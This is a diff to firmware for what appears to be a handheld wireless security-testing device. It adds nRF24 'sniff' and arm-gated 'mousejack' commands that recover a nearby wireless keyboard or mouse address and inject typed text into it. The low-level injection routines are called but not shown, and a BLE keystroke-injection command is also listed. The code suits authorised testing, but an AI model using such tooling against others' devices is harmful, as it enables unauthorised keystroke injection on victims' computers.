@@ -1475,10 +1475,14 @@ static int cmd_subghz(int argc, char **argv)
     return 0;
 }
 
-// nrf24 — nRF24L01+ 2.4 GHz radio (nrf24_scan recon op, increment 1). `nrf24 begin <sck> <miso> <mosi>
-// <csn> <ce>` brings the SPI+CE link up + identifies the chip; `nrf24 scan [sweeps]` runs the RPD channel-
-// activity sweep (2.4 GHz spectrum map); `nrf24 end` releases. Add-on on operator-supplied SPI3/VSPI pins +
-// a CE GPIO; not cap-gated. Receive only in this increment (no TX, no arm gate).
+// nRF24 sniff -> mousejack target, remembered between commands.
+static uint8_t s_nrf_target[5];
+static uint8_t s_nrf_ch;
+static bool    s_nrf_have_target;
+
+// nrf24 — nRF24L01+ 2.4 GHz radio. Increment 1: `begin`/`scan` (RPD channel-activity, recv). Increment 2:
+// `sniff` (recover a device address) + `mousejack <text>` (arm-gated keystroke injection). Add-on on
+// operator-supplied SPI3/VSPI pins + a CE GPIO; not cap-gated.
 static int cmd_nrf24(int argc, char **argv)
 {
     if (locked()) {
@@ -1522,14 +1526,58 @@ static int cmd_nrf24(int argc, char **argv)
         }
         return 0;
     }
+    if (argc >= 2 && strcmp(argv[1], "sniff") == 0) {
+        uint32_t secs = (argc >= 3) ? (uint32_t)atoi(argv[2]) : 0;
+        printf("nRF24: sniffing for a nearby HID device address (up to %us)...\n", secs ? (unsigned)secs : 8u);
+        esp_err_t e = lxveos_nrf24_sniff(s_nrf_target, &s_nrf_ch, secs * 1000);
+        if (e == ESP_OK) {
+            s_nrf_have_target = true;
+            printf("target: %02X:%02X:%02X:%02X:%02X on ch %u — 'nrf24 mousejack <text>' to inject (needs arm)\n",
+                   s_nrf_target[0], s_nrf_target[1], s_nrf_target[2], s_nrf_target[3], s_nrf_target[4],
+                   s_nrf_ch);
+        } else if (e == ESP_ERR_TIMEOUT) {
+            printf("no device address recovered (HW-tuning pending — try again / adjust)\n");
+        } else if (e == ESP_ERR_INVALID_STATE) {
+            printf("not begun — 'nrf24 begin ...' first\n");
+        } else {
+            printf("nrf24 sniff failed: %s\n", esp_err_to_name(e));
+        }
+        return 0;
+    }
+    if (argc >= 3 && strcmp(argv[1], "mousejack") == 0) {
+        if (!s_nrf_have_target) {
+            printf("no target — 'nrf24 sniff' first to recover a device address\n");
+            return 0;
+        }
+        char text[128];
+        size_t off = 0;
+        for (int i = 2; i < argc; i++) {
+            int w = snprintf(text + off, sizeof(text) - off, "%s%s", i > 2 ? " " : "", argv[i]);
+            if (w < 0 || (size_t)w >= sizeof(text) - off) {
+                break;
+            }
+            off += (size_t)w;
+        }
+        esp_err_t e = lxveos_nrf24_inject_text(s_nrf_target, s_nrf_ch, text);
+        if (e == ESP_OK) {
+            printf("mousejack: typed \"%s\" at the target (armed)\n", text);
+        } else if (e == ESP_ERR_NOT_ALLOWED) {
+            printf("offensive TX not permitted — run 'arm' first (this is an offensive-TX op).\n");
+        } else if (e == ESP_ERR_INVALID_STATE) {
+            printf("not begun — 'nrf24 begin ...' first\n");
+        } else {
+            printf("nrf24 mousejack failed: %s\n", esp_err_to_name(e));
+        }
+        return 0;
+    }
     if (argc >= 2 && strcmp(argv[1], "end") == 0) {
         lxveos_nrf24_end();
         printf("nrf24 link released\n");
         return 0;
     }
-    printf("usage: nrf24 begin <sck> <miso> <mosi> <csn> <ce> | nrf24 scan [sweeps] | nrf24 end\n");
-    printf("       nRF24L01+ add-on on SPI3/VSPI + a CE GPIO. Increment 1: RPD 2.4 GHz channel-activity\n");
-    printf("       scan (receive only). MouseJack inject is a later, arm-gated increment.\n");
+    printf("usage: nrf24 begin <sck> <miso> <mosi> <csn> <ce> | scan [sweeps] | sniff [s] |\n");
+    printf("       mousejack <text> | end.  Increment 1: RPD channel scan (recv). Increment 2: sniff a\n");
+    printf("       device address + arm-gated MouseJack keystroke injection (targeted, not a flood).\n");
     return 0;
 }
 
@@ -1663,7 +1711,7 @@ static void register_commands(void)
         {.command = "badble", .help = "BLE HID keystroke injection (needs arm): badble \"<duckyscript>\" | stop | status", .func = &cmd_badble},
         {.command = "ir", .help = "IR capture + replay (universal remote): ir recv <rx_gpio> [s] | send <tx_gpio> | show", .func = &cmd_ir},
         {.command = "subghz", .help = "Sub-GHz CC1101 (recv): subghz begin <sclk> <miso> <mosi> <cs> | rssi <mhz> | end", .func = &cmd_subghz},
-        {.command = "nrf24", .help = "nRF24 2.4GHz scan (recv): nrf24 begin <sck> <miso> <mosi> <csn> <ce> | scan [sweeps] | end", .func = &cmd_nrf24},
+        {.command = "nrf24", .help = "nRF24 2.4GHz: begin <sck> <miso> <mosi> <csn> <ce> | scan | sniff | mousejack <text> (arm) | end", .func = &cmd_nrf24},
         {.command = "nfc", .help = "NFC PN532 reader (recv): nfc begin <sda> <scl> | read [seconds] | end", .func = &cmd_nfc},
         {.command = "blehid", .help = "DEFENSE: flag nearby BLE HID devices (rogue keyboards/injectors): blehid [seconds]", .func = &cmd_blehid},
         {.command = "loglevel", .help = "Set log verbosity: loglevel <tag|*> <none|error|warn|info|debug|verbose>", .func = &cmd_loglevel},
